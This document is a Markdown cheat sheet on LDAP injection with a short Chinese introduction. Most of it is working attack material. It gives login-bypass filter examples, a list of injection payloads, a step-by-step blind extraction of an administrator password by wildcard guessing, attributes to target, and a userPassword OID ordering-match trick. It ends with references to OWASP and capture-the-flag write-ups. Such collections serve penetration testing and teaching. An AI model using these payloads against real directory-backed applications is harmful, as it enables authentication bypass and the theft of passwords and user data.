# LDAP injection

LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。
简单来说，可以理解为LDAP是某种搜索协议，就像我们熟知的数据库一样，我们利用SQL语句进行查询数据库中的数据。而LDAP也有一套自己的查询语句，来进行查询。很典型的例子就是Windows域环境，如果开发者对外提供了查询域信息的接口(如员工信息查询接口)且为对其做安全性限制，则容易出现LDAP注入漏洞。


## 目录

* [Exploitation](#Exploitation)
* [Payloads](#Payloads)
* [Blind Exploitation](#Blind\ Exploitation)
* [Defaults attributes](#Defaults\ attributes)
* [References](#References)

## Exploitation

Example 1.

```sql
user  = *)(uid=*))(|(uid=*
pass  = password
query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"
```

Example 2

```sql
user  = admin)(!(&(1=0
pass  = q))
query = (&(uid=admin)(!(&(1=0)(userPassword=q))))
```

## Payloads

```text
*
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
*/*
*|
/
//
//*
@*
|
admin*
admin*)((|userpassword=*)
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
```

## Blind Exploitation

We can extract using a bypass login

```sql
(&(sn=administrator)(password=*))    : OK
(&(sn=administrator)(password=A*))   : KO
(&(sn=administrator)(password=B*))   : KO
...
(&(sn=administrator)(password=M*))   : OK
(&(sn=administrator)(password=MA*))  : KO
(&(sn=administrator)(password=MB*))  : KO
...
(&(sn=administrator)(password=MY*))  : OK
(&(sn=administrator)(password=MYA*)) : KO
(&(sn=administrator)(password=MYB*)) : KO
(&(sn=administrator)(password=MYC*)) : KO
...
(&(sn=administrator)(password=MYK*)) : OK
(&(sn=administrator)(password=MYKE)) : OK
```

## Defaults attributes

Can be used in an injection like `*)(ATTRIBUTE_HERE=*`

```bash
userPassword
surname
name
cn
sn
objectClass
mail
givenName
commonName
```

## Exploiting userPassword attribute

`userPassword` attribute is not a string like the `cn` attribute for example but it’s an OCTET STRING
In LDAP, every object, type, operator etc. is referenced by an OID : octetStringOrderingMatch (OID 2.5.13.18).

> octetStringOrderingMatch (OID 2.5.13.18): An ordering matching rule that will perform a bit-by-bit comparison (in big endian ordering) of two octet string values until a difference is found. The first case in which a zero bit is found in one value but a one bit is found in another will cause the value with the zero bit to be considered less than the value with the one bit.

```bash
userPassword:2.5.13.18:=\xx (\xx is a byte)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

## References

* [OWASP LDAP Injection](https://www.owasp.org/index.php/LDAP_injection)
* [LDAP Blind Explorer](http://code.google.com/p/ldap-blind-explorer/)
* [ECW 2018 : Write Up - AdmYSsion (WEB - 50) - 0xUKN](https://0xukn.fr/posts/WriteUpECW2018AdmYSsion/)
* [Quals ECW 2018 - Maki](https://maki.bzh/courses/blog/writeups/qualecw2018/)